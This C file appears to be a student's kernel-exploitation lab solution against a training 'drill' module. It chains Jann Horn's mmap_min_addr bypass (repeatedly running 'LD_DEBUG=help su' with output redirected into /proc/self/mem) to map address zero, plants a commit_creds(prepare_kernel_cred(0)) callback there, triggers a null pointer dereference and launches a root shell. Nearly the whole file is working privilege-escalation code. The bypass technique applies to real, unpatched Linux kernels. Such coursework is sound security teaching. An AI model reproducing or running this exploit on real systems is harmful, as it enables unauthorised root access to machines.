/*
 * Student ID: U201911803
 * Author: XuBiang 徐必昂
 *
 * Based on wonderful mmap_min_addr bypass by Jann Horn:
 *   https://bugs.chromium.org/p/project-zero/issues/detail?id=1792&desc=2
 */

#define _GNU_SOURCE

#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

/* ============================== Kernel stuff ============================== */

/* Addresses from System.map (no KASLR) */
#define COMMIT_CREDS_PTR 0xffffffff81084370lu         // MDL: fix this symbol
#define PREPARE_KERNEL_CRED_PTR 0xffffffff810845a0lu  // MDL: fix this symbol

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS_PTR;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED_PTR;

void __attribute__((regparm(3))) root_it(unsigned long arg1, bool arg2) {
    commit_creds(prepare_kernel_cred(0));
}

struct drill_item_t {
    uint32_t foo;
    uint64_t callback;
    char bar[1];
};

/* ========================================================================== */

void run_sh(void) {
    pid_t pid = -1;
    char* args[] = {
        "/bin/sh",
        "-i",
        NULL};
    int status = 0;

    pid = fork();

    if (pid < 0) {
        perror("[-] fork()");
        return;
    }

    if (pid == 0) {
        execve("/bin/sh", args, NULL); /* Should not return */
        perror("[-] execve");
        exit(EXIT_FAILURE);
    }

    if (wait(&status) < 0)
        perror("[-] wait");
}

void init_payload(void* p) {
    struct drill_item_t* item = (struct drill_item_t*)p;

    item->callback = (uint64_t)root_it;

    printf("[+] payload:\n");
    printf("\tstart at %p\n", p);
    printf("\tcallback %lx\n", item->callback);
}

int act(int fd, char code) {
    ssize_t bytes = 0;

    bytes = write(fd, &code, 1);
    if (bytes <= 0) {
        perror("[-] write");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

int main(void) {
    int ret = EXIT_FAILURE;
    int mem_fd = -1;
    int drill_fd = -1;
    char cmd[1000];
    void* map = NULL;
    unsigned long addr = 0;

    printf("[+] begin as: uid=%d, euid=%d\n", getuid(), geteuid());

    // MDL: copy the reproducer from the blog below to map zero address
    // MDL: https://bugs.chromium.org/p/project-zero/issues/detail?id=1792&desc=2
    // XBA: LD_DEBUG=help su 1>/proc/self/mem -> mem_write -> mem_rw -> access_remote_vm
    //      -> __access_remote_vm -> get_user_pages_remote -> __get_user_pages_locked
    //      -> __get_user_pages -> find_extend_vma
    //      Then, if the VMA in question has the VM_GROWSDOWN flag set:
    //      expand_stack -> expand_downwards -> security_mmap_addr -> cap_mmap_addr
    //      This, if the address is below dac_mmap_min_addr, does a capability check:
    //      ret = cap_capable(current_cred(), &init_user_ns, CAP_SYS_RAWIO, SECURITY_CAP_AUDIT);
    //      But this check is performed against current_cred(), which are the creds of the
    //      task doing the write(), not the creds of the task whose VMA is being changed.
    map = mmap((void*)0x10000, 0x1000, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS | MAP_GROWSDOWN | MAP_FIXED, -1, 0);
    if (map == MAP_FAILED) {
        perror("[-] mmap failed");
        goto end;
    } else {
        printf("[+] mmap done\n");
    }

    mem_fd = open("/proc/self/mem", O_RDWR);
    if (mem_fd == -1) {
        perror("[-] open mem failed");
        goto end;
    } else {
        printf("[+] open mem done\n");
    }

    addr = (unsigned long)map;
    sprintf(cmd, "LD_DEBUG=help su 1>&%d", mem_fd);
    printf("[+] addr: \n");
    while (addr != 0) {
        printf("%x -> ", addr);
        addr -= 0x1000;
        if (lseek(mem_fd, addr, SEEK_SET) == -1) {
            perror("[-] lseek failed");
            goto end;
        }
        system(cmd);
    }

    printf("%x\n", addr);
    printf("[+] /proc/$PPID/maps:\n");
    system("head -n1 /proc/$PPID/maps");
    printf("[+] data at NULL: 0x%lx\n", *(unsigned long*)0);

    // MDL: echo '1' > /sys/kernel/debug/drill/drill_act
    // MDL: echo '4' > /sys/kernel/debug/drill/drill_act
    // XBA: alloc & reset, now the pointer is set to NULL
    drill_fd = open("/sys/kernel/debug/drill/drill_act", O_WRONLY);
    if (drill_fd == -1) {
        perror("[-] open drill failed");
        goto end;
    } else {
        printf("[+] open drill done\n");
    }
    if (act(drill_fd, '1') == EXIT_FAILURE) {
        perror("[-] drill alloc failed");
        goto end;
    } else {
        printf("[+] drill alloc done\n");
    }
    if (act(drill_fd, '4') == EXIT_FAILURE) {
        perror("[-] drill reset failed");
        goto end;
    } else {
        printf("[+] drill reset done\n");
    }

    init_payload((void*)NULL);

    // MDL: echo '2' > /sys/kernel/debug/drill/drill_act
    // XBA: callback to trigger the null pointer dereference
    if (act(drill_fd, '2') == EXIT_FAILURE) {
        perror("[-] drill callback failed");
        goto end;
    } else {
        printf("[+] drill callback done\n");
    }

    if (getuid() == 0 && geteuid() == 0) {
        printf("[+] finish as: uid=0, euid=0, start sh...\n");
        run_sh();
        ret = EXIT_SUCCESS;
    } else {
        printf("[-] didn't get root\n");
        goto end;
    }

    printf("[+] The End\n");

end:
    if (drill_fd >= 0) {
        ret = close(drill_fd);
        if (ret != 0) { perror("[-] close drill_fd failed"); }
    }

    if (mem_fd >= 0) {
        ret = close(mem_fd);
        if (ret != 0) { perror("[-] close mem_fd failed"); }
    }

    return ret;
}
